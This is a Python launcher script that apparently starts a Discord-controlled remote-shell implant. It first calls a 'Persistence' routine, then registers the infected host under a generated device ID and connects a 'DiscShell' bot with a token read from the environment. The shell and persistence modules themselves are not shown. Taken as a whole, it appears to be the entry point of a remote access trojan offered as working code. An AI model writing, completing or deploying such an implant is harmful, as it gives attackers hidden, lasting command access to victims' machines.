import os
import random
import asyncio
import socket
from module import DiscShell, Persistence
from dotenv import load_dotenv

def get_dynamic_id():
    hostname = socket.gethostname()
    random_suffix = '{:04x}'.format(random.randint(0, 0xffff))
    return f"{hostname}-{random_suffix}"

async def main():
    try:
        load_dotenv(verbose=True)
        my_port_id = get_dynamic_id()
        print(f"Device ID Generated: {my_port_id}")
        shellBot = DiscShell(port_id=my_port_id)
        async with shellBot:
            await shellBot.start(os.getenv('TOKEN'))
    except Exception as e:
        print(f"Error starting bot: {e}")

if __name__ == "__main__":
    try:
        persistence = Persistence()  
        persistence.start()
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Bot is shutting down...")
    except Exception as e:
        print(f"Error in main execution: {e}")